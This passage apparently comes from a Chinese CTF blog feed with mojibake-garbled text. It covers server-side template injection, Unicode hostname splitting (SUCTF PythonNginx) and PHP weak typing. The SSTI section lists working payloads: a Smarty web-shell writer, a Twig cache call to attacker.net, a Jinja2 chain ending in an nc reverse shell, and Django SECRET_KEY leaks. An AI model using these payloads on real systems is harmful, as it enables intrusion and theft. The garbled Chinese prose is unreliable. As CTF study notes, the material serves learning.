IsVuln{{2*8}}OK</code></pre><p>ç”±äºä½œä¸ºTwingæ¨¡æ¿çš„é»˜è®¤æ³¨é‡Šå½¢å¼ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«å‰ç«¯è¾“å‡ºï¼Œè€Œ<code>2*8</code>åˆ™ä¼šè¢«è®¡ç®—ï¼Œæœ€ç»ˆè¾“å‡º</p><pre><code>Hello IsVuln16OK</code></pre><p>å¾—åˆ°æ‰«æçš„å¤§è‡´æµç¨‹ä¸º</p><p><img src="http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png" alt="æ‰«ææµç¨‹(Twig)"></p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ›´æ”¹è¯·æ±‚å‚æ•°ä½¿ä¹‹æ‰¿è½½å«æœ‰æ¨¡æ¿å¼•æ“è¯­æ³•çš„ Payloadï¼Œé€šè¿‡é¡µé¢æ¸²æŸ“è¿”å›çš„å†…å®¹æ£€æµ‹æ‰¿è½½çš„ Payload æ˜¯å¦æœ‰å¾—åˆ°ç¼–è¯‘è§£æï¼Œæœ‰è§£æåˆ™å¯ä»¥åˆ¤å®šå«æœ‰ Payload å¯¹åº”æ¨¡æ¿å¼•æ“æ³¨å…¥ï¼Œå¦åˆ™ä¸å­˜åœ¨ SSTIã€‚</p><h2 id="å¸¸ç”¨å¼•æ“"><a href="#å¸¸ç”¨å¼•æ“" class="headerlink" title="å¸¸ç”¨å¼•æ“"></a>å¸¸ç”¨å¼•æ“</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ol><li>Smartyï¼š<code>{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)}</code>ã€<code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}</code></li><li>Twigï¼š<code>{{_self.env.setCache("ftp://attacker.net:2121")}}``{{_self.env.loadTemplate("backdoor")}}</code>ã€<code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></li><li>Bladeï¼š</li></ol><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><ol><li>JSP</li><li>FreeMarkerï¼š<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) }</code></li><li>Velocity</li><li>Spring boot</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ol><li>Jinja2ï¼š<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}</code><br> <code>//å†™æ–‡ä»¶</code> {{ config.from_pyfile('/tmp/evil') }} //åŠ è½½system {{ config['SHELL']('nc xxxx xx -e /bin/sh') }} //æ‰§è¡Œå‘½ä»¤åå¼¹SHELL</li><li>djangoï¼š<code>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}</code>ã€<code>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></li><li>tornadoï¼š<code>http://117.78.26.79:31093/error?msg={{handler.settings}}</code></li></ol><h2 id="å¦‚ä½•åˆ¤æ–­å¼•æ“ç§ç±»"><a href="#å¦‚ä½•åˆ¤æ–­å¼•æ“ç§ç±»" class="headerlink" title="å¦‚ä½•åˆ¤æ–­å¼•æ“ç§ç±»"></a>å¦‚ä½•åˆ¤æ–­å¼•æ“ç§ç±»</h2><p>è¿™é‡Œå‚è€ƒjameså¤§ç¥çš„æ–‡ç« </p><blockquote><p>Green and red arrows represent â€˜successâ€™ and â€˜failureâ€™ responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.</p></blockquote><p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="æ£€æµ‹æ€è·¯"></p><h2 id="OGeak-ctf-Render"><a href="#OGeak-ctf-Render" class="headerlink" title="OGeak-ctf Render"></a>OGeak-ctf Render</h2><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://47.107.244.251:18080/" title="ç‚¹è¿™é‡Œ" target="_blank" rel="noopener">http://47.107.244.251:18080/</a></p><p>æŸ¥çœ‹åç«¯ä»£ç </p><pre><code>var app = new Vue({    el: &apos;#app&apos;,    data: {        content: &apos;&apos;,        result: &apos;&apos;    },    methods: {        request: function(event) {            var vm = this            axios.post(&apos;/render&apos;, {                content: vm.content            })                .then(function (response) {                    console.log(response)                    vm.result = response.data.result                })                .catch(function (error) {                    console.log(error)                    vm.result = error                })        }    }})</code></pre><p>å°†æˆ‘ä»¬çš„è¾“å…¥å€¼è¿”å›ç»™<code>result</code>è¿›è¡Œè¾“å‡º.è¿™é‡Œä¼¼ä¹æ²¡ç”¨åˆ°ä»€ä¹ˆæ¨¡æ¿è¯­æ³•ï¼Œä½†æ˜¯å®ƒä»ç„¶ä¼šå°†<code>post</code>çš„<code>content</code>ç”¨æ¨¡æ¿çš„æ–¹å¼å»æ¸²æŸ“ã€‚</p><p>æˆ‘ä»¬å°è¯•å¸¸ç”¨çš„æ¨¡æ¿å¼•æ“è¯­æ³•æµ‹è¯•</p><p>æœ€ç»ˆ</p><pre><code>[[1+1]]</code></pre><p>è¢«æˆåŠŸè§£æ</p><p>æˆ‘ä»¬éšä¾¿è®¿é—®ä¸€ä¸ªé¡µé¢å‘ç°æ˜¯Spring boot,æ—¢ç„¶æ˜¯Javaå†™çš„é‚£æˆ‘ä»¬å°±javaè¯»æ–‡ä»¶ï¼Œè¯­æ³•å‚è€ƒ<a href="https://dotblogs.com.tw/cylcode/2018/09/21/170510" title="è¿™é‡Œ" target="_blank" rel="noopener">https://dotblogs.com.tw/cylcode/2018/09/21/170510</a></p><p>payload:</p><pre><code>[[${new java.io.BufferedReader(new java.io.FileReader(&quot;/flag&quot;)).readLine()}]]</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84</a><br><a href="https://portswigger.net/blog/server-side-template-injection#top" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection#top</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HostSplit-Exploitable</title>
      <link href="/2019/08/22/HostSplit/"/>
      <url>/2019/08/22/HostSplit/</url>
      
        <content type="html"><![CDATA[<p>ğŸ±é»‘å¸½å¤§ä¼šè®®é¢˜</p><a id="more"></a><p>8/22/2019 11:39:23 AM </p><h1 id="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-å­¦ä¹ "><a href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-å­¦ä¹ " class="headerlink" title="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization å­¦ä¹ "></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization å­¦ä¹ </h1><h2 id="IDN-ä¸-UTF-8"><a href="#IDN-ä¸-UTF-8" class="headerlink" title="IDN ä¸ UTF-8"></a>IDN ä¸ UTF-8</h2><p><strong>IDN</strong></p><blockquote><p>å›½é™…åŒ–åŸŸåIDNs (Internationalized Domain Names)ä¹Ÿç§°å¤šè¯­ç§åŸŸåï¼Œæ˜¯æŒ‡éè‹±è¯­å›½å®¶ä¸ºæ¨å¹¿æœ¬å›½è¯­è¨€çš„åŸŸåç³»ç»Ÿçš„ä¸€ä¸ªæ€»ç§°ï¼Œä¾‹å¦‚å«æœ‰æ—¥æ–‡çš„ä¸ºæ—¥æ–‡åŸŸåï¼Œå«æœ‰ä¸­æ–‡çš„åŸŸåä¸ºä¸­æ–‡åŸŸåã€‚<br>ç§‘ç ”äººå‘˜åˆå°†çº¯æ•°å­—è¡¨ç¤ºçš„IPåœ°å€åŸºç¡€ä¸Šæ¨å‡ºæ›´åŠ ä¾¿äºè®°å¿†çš„å­—ç¬¦å‹è®¿é—®æ ‡è¯†ï¼Œå³åŸºäºIPåœ°å€çš„åŸŸåç³»ç»Ÿã€‚è¿™äº›åŸŸååªèƒ½ä½¿ç”¨63ä¸ªASCIIå­—ç¬¦ï¼ˆâ€a-zâ€ï¼Œâ€A-Zâ€ï¼Œâ€0-9â€ï¼Œâ€-â€œï¼‰. éšç€äº’è”ç½‘åœ¨éè‹±è¯­å›½å®¶çš„è¿…çŒ›å‘å±•ï¼Œä¹åå¹´ä»£æœ«æœŸå›½é™…äº’è”ç½‘ç•Œæå‡ºäº†å°†åŸæœ¬åªèƒ½ä½¿ç”¨63ä¸ªASCIIå­—ç¬¦çš„åŸŸåï¼Œé‡‡ç”¨æœ¬åœ°è¯­è¨€æ–‡å­—æ¥è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯å‡ºç°äº†å¯¹å¤šè¯­ç§åŸŸåçš„éœ€æ±‚ã€‚</p></blockquote><p><a href="http://ä¸­å›½æ”¿åºœ.æ”¿åŠ¡/" target="_blank" rel="noopener">http://ä¸­å›½æ”¿åºœ.æ”¿åŠ¡/</a></p><p>è¿™æ˜¯æˆ‘å›½çš„æ”¿åºœç½‘ç«™ï¼</p><p><strong>UTF-8</strong></p><blockquote><p>UTF-8ï¼ˆ8-bit Unicode Transformation Formatï¼‰æ˜¯ä¸€ç§é’ˆå¯¹Unicodeçš„å¯å˜é•¿åº¦å­—ç¬¦ç¼–ç ï¼Œç”±Ken Thompsonäº1992å¹´åˆ›å»ºï¼Œç°åœ¨å·²ç»æ ‡å‡†åŒ–ä¸ºRFC 3629ã€‚UTF-8ç”¨1åˆ°4ä¸ªå­—èŠ‚ç¼–ç Unicodeå­—ç¬¦ã€‚ç”¨åœ¨ç½‘é¡µä¸Šå¯ä»¥ç»Ÿä¸€é¡µé¢æ˜¾ç¤ºä¸­æ–‡ç®€ä½“ç¹ä½“åŠå…¶å®ƒè¯­è¨€.</p></blockquote><p>Puny ç¼–ç  (Punycode)</p><blockquote><p>è¿™æ˜¯ä¸€ä¸ªç®€æ˜“è€Œå‡†ç¡®çš„IDN ASCII ç¼–ç ç³»ç»Ÿ (ASCII-Compatible Encoding (ACE))ã€‚å®ƒèƒ½è½¬æ¢ä¸€ç³»åˆ—çš„ å­—ç¬¦ç¼–ç æˆä¸ºå­—ç¬¦ä»¥ç¬¦åˆä¸»æœºåç§°(hostname)æ ‡å‡† (ASCII å­—æ¯ï¼Œæ•°ä½å’Œè¿å­—ç¬¦å·)ã€‚<br>ä¾‹: xnâ€“0zwm56d.test </p></blockquote><pre><code>ä¸­å›½.æ”¿åºœ-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id="Unicode-â”-ASCII-â€“-A-Two-Step-Process"><a href="#Unicode-â”-ASCII-â€“-A-Two-Step-Process" class="headerlink" title="Unicode â” ASCII â€“ A Two Step Process"></a>Unicode â” ASCII â€“ A Two Step Process</h2><ol><li>Normalization Convert characters to a â€œstandardized formâ€.</li><li>Punycoding Turn Unicode into ASCII.</li></ol><p>æ„æ€å°±æ˜¯è¯´IDNçš„ä½¿ç”¨åº•å±‚è¿˜æ˜¯ASCIIçš„åŠŸåŠ³ã€‚å…ˆè½¬æ¢æˆæ ‡å‡†å½¢å¼ç„¶åè¿›è¡Œpunyç¼–ç ã€‚</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg" alt="è½¬æ¢è¿‡ç¨‹"></p><h2 id="Splitting-Hostnames"><a href="#Splitting-Hostnames" class="headerlink" title="Splitting Hostnames"></a>Splitting Hostnames</h2><pre><code>https://evil.câ„€.Example.com</code></pre><p>æˆ‘ä»¬å¯¹ä»–è¿›è¡Œè½¬æ¢æˆASCIIä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg" alt="Normalizing "></p><pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything â€“ itâ€™s all ASCII now!</strong>ä¹Ÿå°±æ˜¯ä¸ç”¨å†æ¬¡ç¼–ç å·²ç»å¯ä»¥è§£æäº†</p><h2 id="python-utf-8-unicode-asciiäº’è½¬"><a href="#python-utf-8-unicode-asciiäº’è½¬" class="headerlink" title="python utf-8,unicode,asciiäº’è½¬"></a>python utf-8,unicode,asciiäº’è½¬</h2><p>unicode-&gt;ascii</p><pre><code>&gt;&gt;&gt; ord(u&apos;è„‘&apos;)33041</code></pre><p>ascii-&gt;unicode</p><pre><code>&gt;&gt;&gt; chr(33041)&apos;è„‘</code></pre><p>unicode &lt;=&gt; utf-8</p><pre><code>&gt;&gt;&gt; n = u.encode(&apos;utf8&apos;)&gt;&gt;&gt; nb&apos;\xe5\xb1\x8c&apos;&gt;&gt;&gt; m = n.decode(&apos;utf8&apos;)</code></pre><p>æ³¨ï¼šlinuxé»˜è®¤ç¼–ç ä¸ºunicodeï¼Œè‹¥ä¸ºå…¶ä»–ä¸¤ç§ç¼–ç è¿›è¡Œè½¬æ¢ï¼Œéœ€unicodeä½œä¸ºâ€œåª’ä»‹</p><h2 id="Python-was-vulnerable"><a href="#Python-was-vulnerable" class="headerlink" title="Python was vulnerable"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit &gt;&gt;&gt; url = &apos;http://canada.câ„€.microsoft.com/some.txt&apos; &gt;&gt;&gt; parts = list(urlsplit(url)) &gt;&gt;&gt; host = parts[1] &gt;&gt;&gt; host &apos;canada.câ„€.microsoft.com&apos; &gt;&gt;&gt; newhost = [] &gt;&gt;&gt; for h in host.split(&apos;.&apos;): ... newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) ... &gt;&gt;&gt; parts[1] = &apos;.&apos;.join(newhost) &gt;&gt;&gt; finalUrl = urlunsplit(parts) &gt;&gt;&gt; finalUrl &apos;http://canada.ca/c.microsoft.com/some.txt&apos; </code></pre><h2 id="Python-had-an-extra-variant"><a href="#Python-had-an-extra-variant" class="headerlink" title="Python had an extra variant"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse &gt;&gt;&gt; r=&apos;http://bing.com&apos;+u&apos;\uFF03&apos;+&apos;:password@products.office.com&apos; &gt;&gt;&gt; o = urlparse(r) &gt;&gt;&gt; o.hostname &apos;products.office.com&apos; &gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) &gt;&gt;&gt; a &apos;http://bing.com#:password@products.office.com&apos; &gt;&gt;&gt; o = urlparse(a) &gt;&gt;&gt; o.hostname &apos;bing.com&apos;</code></pre><h2 id="SUCTF-PythonNginx"><a href="#SUCTF-PythonNginx" class="headerlink" title="SUCTF PythonNginx"></a>SUCTF PythonNginx</h2><p>SUCTFä¸­çš„ä¸€é“é¢˜ï¼š</p><pre><code>    @app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return &quot;æˆ‘æ‰Œ your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:        return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host    newhost = []    for h in host.split(&apos;.&apos;):        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    #å»æ‰ url ä¸­çš„ç©ºæ ¼    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;æˆ‘æ‰Œ your problem? 333&quot;</code></pre><p>çˆ†ç ´æœ€åä¸€ä½c</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():    for x in range(65536):        uni=chr(x)        url=&quot;http://suctf.c{}&quot;.format(uni)        try:            if getUrl(url):                print(&apos;11&apos;)                print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])        except:            passdef getUrl(url):    url = url    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return False    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:        return False    newhost = []    for h in host.split(&apos;.&apos;):        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return True    else:        return Falseif __name__==&quot;__main__&quot;:    get_unicode()str: ï¿½G unicode: \u2105str: ï¿½ï¿½ unicode: \uff23str: ï¿½ï¿½ unicode: \uff43[Finished in 6.5s]</code></pre><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹å„ä¸ªåˆ¤æ–­çš„ç»“æœ</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parseurl = &apos;http://canada.câ„€.microsoft.com/some.txt&apos;parts = parse.urlparse(url)&gt;&gt;&gt; partsParseResult(scheme=&apos;http&apos;, netloc=&apos;canada.câ„€.microsoft.com&apos;, path=&apos;/some.txt&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)&gt;&gt;&gt; host = parts.hostname&gt;&gt;&gt; host&apos;canada.câ„€.microsoft.com&apos;&gt;&gt;&gt; parts1 = list(urlsplit(url))&gt;&gt;&gt; parts1[&apos;http&apos;, &apos;canada.câ„€.microsoft.com&apos;, &apos;/some.txt&apos;, &apos;&apos;, &apos;&apos;]</code></pre><p>å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥ç»•è¿‡åˆ¤æ–­äº†</p><h3 id="hostsæ–‡ä»¶"><a href="#hostsæ–‡ä»¶" class="headerlink" title="hostsæ–‡ä»¶"></a>hostsæ–‡ä»¶</h3><p>Hostsæ˜¯ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå¯ä»¥ç”¨è®°äº‹æœ¬ç­‰å·¥å…·æ‰“å¼€ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„IPåœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ï¼Œå½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»Hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IPåœ°å€ï¼Œä¸€æ—¦æ‰¾åˆ°ï¼Œç³»ç»Ÿä¼šç«‹å³æ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç³»ç»Ÿå†ä¼šå°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡ŒIPåœ°å€çš„è§£æã€‚</p><h3 id="fileåè®®"><a href="#fileåè®®" class="headerlink" title="fileåè®®"></a>fileåè®®</h3><p>ä¸­æ–‡æ„æ€ï¼šæœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®<br>ä»€ä¹ˆæ˜¯Fileï¼šFileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œå°±å¦‚åŒåœ¨Windowsèµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€æ–‡ä»¶ä¸€æ ·ã€‚<br>å¦‚ä½•ä½¿ç”¨Fileï¼šè¦ä½¿ç”¨Fileåè®®ï¼ŒåŸºæœ¬çš„æ ¼å¼å¦‚ä¸‹ï¼šfile:///æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚è¦æ‰“å¼€Fç›˜flashæ–‡ä»¶å¤¹ä¸­çš„1.swfæ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨èµ„æºç®¡ç†å™¨æˆ–æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥ï¼šfile:///f:/flash/1.swfå›è½¦ã€‚</p><h3 id="nginxé…ç½®"><a href="#nginxé…ç½®" class="headerlink" title="nginxé…ç½®"></a>nginxé…ç½®</h3><p> Nginxçš„é…ç½®æ–‡ä»¶æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒä¸€èˆ¬ä½äºNginxå®‰è£…ç›®å½•çš„confç›®å½•ä¸‹ï¼Œæ•´ä¸ªé…ç½®æ–‡ä»¶æ˜¯ä»¥blockçš„å½¢å¼ç»„ç»‡çš„ã€‚æ¯ä¸ªblockä¸€èˆ¬ä»¥ä¸€ä¸ªå¤§æ‹¬å·â€œ{â€æ¥è¡¨ç¤ºã€‚block å¯ä»¥åˆ†ä¸ºå‡ ä¸ªå±‚æ¬¡ï¼Œæ•´ä¸ªé…ç½®æ–‡ä»¶ä¸­Mainå‘½ä»¤ä½äºæœ€é«˜å±‚ï¼Œåœ¨Mainå±‚ä¸‹é¢å¯ä»¥æœ‰Eventsã€ HTTPç­‰å±‚çº§ï¼Œè€Œåœ¨HTTPå±‚ä¸­åˆåŒ…å«Serverå±‚ï¼Œå³server block, serverblockä¸­åˆå¯åˆ†ä¸ºlocationå±‚ï¼Œå¹¶ä¸”ä¸€ä¸ªserver blockä¸­å¯ä»¥åŒ…å«å¤šä¸ªlocation blockã€‚</p><p>nginxé…ç½®æ–‡ä»¶è·¯å¾„</p><pre><code>[root@localhost vhost]# locate nginx.conf/usr/local/nginx/conf/nginx.conf/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hostsæ–‡ä»¶ç»‘å®šæœ¬åœ°å›ç¯åœ°å€ï¼Œå°è¯•fileè¯»æ–‡ä»¶</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg" alt="å°è¯•è¯»æ–‡ä»¶"></p><p>è¯»nginxé…ç½®æ–‡ä»¶</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg" alt="è¯»é…ç½®æ–‡ä»¶"></p><p>è¯»flag</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg" alt="è¯»flag"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>black_magic</title>
      <link href="/2019/08/19/Black-magic/"/>
      <url>/2019/08/19/Black-magic/</url>
      
        <content type="html"><![CDATA[<p>åˆ«è¯´äº†ï¼Œå¬æˆ‘çš„ï¼php is the best language!æˆ‘ä¸å…è®¸ä½ æœ‰åˆ«çš„æƒ³æ³•ï¼ </p><p>æˆ‘è¦æˆ‘è§‰å¾—ï¼ä¸è¦ä½ è§‰å¾—ï¼</p><a id="more"></a><h1 id="php-å¼±ç±»å‹æ€»ç»“"><a href="#php-å¼±ç±»å‹æ€»ç»“" class="headerlink" title="php å¼±ç±»å‹æ€»ç»“"></a>php å¼±ç±»å‹æ€»ç»“</h1><h2 id="å­—ç¬¦ä¸æ•°å­—çš„æ¯”è¾ƒ"><a href="#å­—ç¬¦ä¸æ•°å­—çš„æ¯”è¾ƒ" class="headerlink" title="å­—ç¬¦ä¸æ•°å­—çš„æ¯”è¾ƒ"></a>å­—ç¬¦ä¸æ•°å­—çš„æ¯”è¾ƒ</h2><pre><code>&lt;?php$a=1;if($a=TRUE)    echo &quot;1111\n&quot;;if($a=&apos;a&apos;)    echo &quot;1111\n&quot;;ç»“æœ11111111</code></pre><p>è”æƒ³åˆ°ä¹‹å‰Pç¥çš„æ–‡ç« ï¼Œ<code>TRUE+TRUE=2</code></p><pre><code>$_=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);        //2echo $_;$__=$_/$_;                    //1</code></pre><p>æ¥æ„é€ æ•°å­—1å’Œ2</p><h2 id="md5æ¯”è¾ƒ"><a href="#md5æ¯”è¾ƒ" class="headerlink" title="md5æ¯”è¾ƒ"></a>md5æ¯”è¾ƒ</h2><pre><code>&lt;?phperror_reporting(0); $flag = &apos;233&apos;;//highlight_file(__FILE__);  $md51 = md5(&apos;QNKCDZO&apos;);  //0e830400451993494058024219903391//$a = $_GET[&apos;b&apos;]; $a = &apos;s878926199a&apos;;$md52 = md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {     echo $flag; } else {     echo &quot;false!!!&quot;;     }}</code></pre><p>phpåœ¨è¿›è¡Œ <code>==</code> æ¯”è¾ƒçš„æ—¶å€™ä¼šè®¤ä¸ºè¯¥å­—ç¬¦ä¸²æ˜¯ç§‘å­¦è®°æ•°æ³•è¡¨ç¤ºçš„æ•°å­—ï¼Œ<code>QNKCDZO</code> MD5å€¼æ˜¯<code>0e</code>å¼€å¤´ï¼Œæˆ‘ä»¬ä¹Ÿæ‰¾åˆ°ä¸€ä¸ªMD5å<code>0e</code>å¼€å¤´çš„è¿™æ ·ä¸¤ä¸ªå­—ç¬¦ä¸²éƒ½è½¬æ¢ä¸ºæ•°å­—0ï¼Œè¿™æ ·å°±å¼±æ¯”è¾ƒç›¸ç­‰ï¼Œä½†æ˜¯å¦‚æœæ˜¯ <code>===</code> å°±ä¸è¡Œäº†ã€‚</p><p> === åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ä¼šåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰å†æ¯”è¾ƒã€‚</p><p> == åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å­—ç¬¦ä¸²ç±»å‹è½¬æ¢ç›¸åŒï¼Œå†æ¯”è¾ƒã€‚å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œã€‚</p><pre><code>var_dump(&apos;admin&apos;==0);var_dump(&apos;1admin&apos;==1);var_dump(&quot;admin1&quot;==1);var_dump(&quot;admin1&quot;==0);var_dump(&quot;0e123345&quot;==&quot;0e3455436&quot;);bool(true)bool(true)bool(false)bool(true)bool(true)</code></pre><p>ä¾‹å¦‚<br>        <?php        $a=$_GET['a'];        if ($a==0) {        echo "1";        }        if ($a) {        echo "must";        }        ?></p><p>æˆ‘ä»¬ä¼ å…¥<code>?a=a1</code>å³å¯</p><p>ä¸€äº›MD5å0eå¼€å¤´çš„ä¾‹å­</p><pre><code>s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904</code></pre><p>json-decode</p><pre><code>&lt;?phpif (isset($_POST[&apos;message&apos;])) {    $message = json_decode($_POST[&apos;message&apos;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) {        echo &quot;flag&quot;;        }     else {        echo &quot;fail&quot;;        }     }     else{         echo &quot;~~~~&quot;; }</code></pre><p>æˆ‘ä»¬åˆ©ç”¨ 0 = admin çš„ç‰¹æ€§ä¼ å…¥ <code>$message = {&quot;key&quot;:0}</code></p><h2 id="å½“MD5ä¸SHA1ç¢°ä¸Šæ•°ç»„"><a href="#å½“MD5ä¸SHA1ç¢°ä¸Šæ•°ç»„" class="headerlink" title="å½“MD5ä¸SHA1ç¢°ä¸Šæ•°ç»„"></a>å½“MD5ä¸SHA1ç¢°ä¸Šæ•°ç»„</h2><pre><code>$a = [1];var_dump(MD5($a));var_dump(sha1($a));NULLNULL</code></pre><p>ä»–ä¿©ç¢°åˆ°æ•°ç»„å°±ä¼šè½¬æ¢æˆ<code>NULL</code></p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><pre><code>&lt;?php var_dump(intval(&apos;2&apos;));            //2var_dump(intval(&apos;3abcd&apos;));        //3    var_dump(intval(&apos;abcd&apos;));        //0var_dump(intval([]));            //0    